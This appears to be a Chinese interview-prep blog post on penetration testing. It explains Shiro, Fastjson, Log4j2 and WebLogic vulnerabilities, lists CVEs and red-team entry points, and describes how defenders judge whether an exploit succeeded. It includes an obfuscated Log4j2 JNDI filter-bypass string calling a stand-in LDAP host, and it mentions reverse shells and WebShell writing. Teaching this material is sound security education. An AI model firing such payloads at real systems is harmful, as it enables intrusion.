---
title: 渗透测试面试系列五：框架漏洞深度分析——Shiro、Fastjson、Log4j、WebLogic
tags: [面试, 渗透测试, Shiro, Fastjson, Log4j, WebLogic, 反序列化, 框架漏洞]
date: 2026-07-18
---

# 渗透测试面试系列五：框架漏洞深度分析——Shiro、Fastjson、Log4j、WebLogic

<!-- more -->

## Shiro 反序列化

### Shiro-550 原理

Apache Shiro < 1.2.4 版本，cookie 字段使用**默认 AES 密钥**加密。不需要有效的用户 Cookie，只要遍历到正确的 Key，就可以利用。漏洞产生的根本原因就是使用了**默认 Key**，攻击者可以用该 Key 加密恶意的反序列化 Payload 放入 `rememberMe` Cookie 中。

### Shiro-721 原理

Apache Shiro < 1.4.2 版本，使用 AES-128-CBC 模式加密。**不需要知道 Key**，但条件受限：需要一个已经登录/合法的用户 Cookie，进行 **Padding Oracle Attack** 填充攻击构造恶意的反序列化。

### Shiro-550 与 Shiro-721 的区别

| | Shiro-550 | Shiro-721 |
|------|------|------|
| 影响版本 | < 1.2.4 | < 1.4.2 |
| 加密方式 | AES | AES-128-CBC |
| 是否需要 Key | 需要（遍历默认Key） | 不需要知道 Key |
| 是否需要合法Cookie | 不需要 | 需要（已登录） |
| 攻击方式 | 默认Key直接利用 | Padding Oracle Attack |

### 如何判断 Shiro 是否利用成功？

1. Cookie **很长**
2. Cookie 正确的话，服务端不会再响应 `Set-Cookie: rememberMe` 字段
3. 大部分 Shiro 存在回显，响应包存在回显消息（也可能不回显或直接反弹 Shell）
4. 与设备运维人员确认是否使用默认 Key、Shiro 版本等，如果使用默认 Key，使用 Key 对疑似攻击请求包进行解密研判

---

## Fastjson 反序列化

### 原理

在请求包中发送恶意的 JSON 格式 Payload，漏洞在处理 JSON 对象时没有对 `@type` 字段进行过滤，导致攻击者可以传入恶意的 `TemplatesImpl` 类。这个类有一个字段 `_bytecodes`，有部分函数会根据这个 `_bytecodes` 生成 Java 实例，达到 Fastjson 通过字段传入一个类，再通过这个类被生成时执行构造函数。

### Fastjson 不出网利用

1. 写文件利用链，写入 WebShell
2. 构造回显
3. 构造时间盲注报路径
4. 开启代理

---

## Log4j2 (CVE-2021-44228)

### 原理

Log4j2 是个日志组件，提供了 Lookups 机制用于添加一些特殊值到日志中。在 Lookups 机制中，由于 **JNDI 功能没有对名称解析做限制**，而某些协议是不安全的，可以允许远程代码执行，从而导致 RCE 漏洞。

### 如何判断 Log4j2 是否利用成功？

1. 出网一般走 RMI、LDAP、DNS，配合 IDS 主机防御系统查看目标主机是否存在外带攻击
2. 查看流量态势，目标主机是否存在 DNSLog 活动
3. 下载目标恶意类，查看目标恶意类执行什么内容
4. 复现攻击

### Log4j2 混淆绕过

1. 使用 `:-` 进行截取和赋值操作，分隔关键字：
   - `${${::-j}${::-n}${::-d}${::-i}:ldap://dns.log}`

2. 使用 `${hostName}`、`${env:USERDOMAIN}`、`${env:COMPUTERNAME}` 配合 DNSLog 快速定位受影响机器进行修复。

---

## WebLogic 漏洞

### 已知漏洞类型

1. 基于 WebLogic T3 协议引起远程代码执行的反序列化漏洞
2. 通过非法字符绕过访问，然后通过 Gadget 调用命令执行
3. 任意文件上传
4. SSRF

---

## 常见框架/中间件漏洞速查表

### 反序列化漏洞

| 组件 | 关键点 |
|------|--------|
| **Shiro** | rememberMe Cookie、默认Key、550/721 |
| **Fastjson** | @type字段、JdbcRowSetImpl、TemplatesImpl |
| **WebLogic** | T3协议、IIOP协议 |
| **JBoss** | JMXInvokerServlet反序列化 |
| **Tomcat** | CVE-2017-12615、CVE-2020-1938(AJP) |

### RCE 漏洞

| 组件 | 关键点 |
|------|--------|
| **Log4j2** | JNDI注入、${}、Lookups机制 |
| **Spring Framework** | CVE-2022-22965、Tomcat日志写WebShell |
| **Spring Cloud Gateway** | SpEL表达式注入、actuator |
| **Struts2** | OGNL表达式注入、%{} |
| **F5 BIG-IP** | CVE-2022-1388、X-F5-Auth-Token绕过 |

### 红队高频打点漏洞

1. Apache Shiro 相关漏洞
2. Fastjson 漏洞
3. Log4j
4. 上传漏洞
5. 边界网络设备资产 + 弱口令
6. Spring、蓝凌 OA、常见 CMS、弱口令

---

## 如何判断攻击利用是否成功？

### 有回显

如 SQL注入的报错/联合查询、任意文件读取、文件探测、命令执行、文件上传。

> 主要看请求包的 Payload 执行了什么，再看服务器响应状态码、响应内容，里面有没有敏感信息，有没有达到恶意 Payload 想要的内容。

### 无回显

如 XSS 盲打、SQL注入的延时/布尔盲注、RCE 无回显利用。

> 无回显的利用一般都是 DNSLog 测试 / 直接反弹 Shell / 直接写文件 WebShell。这种高危操作一般需要上机排查、复现，或配合 IDS 主机安全设备来查看有没有外带/反弹/WebShell。也可以与运维人员确定受影响资产的一个系统框架/组件/中间件版本，判断是否在受影响范围内。

### 判断出靶标的 CMS，对外网打点有什么意义？

1. 判断当前使用的 CMS 是否存在 Nday，尝试利用公开的 POC、EXP 进行测试
2. 根据 CMS 特征关联同 CMS 框架站点，进行敏感备份文件扫描，有可能获取到站点备份文件，尝试从 CMS 源码进行代码审计，挖掘潜在漏洞。
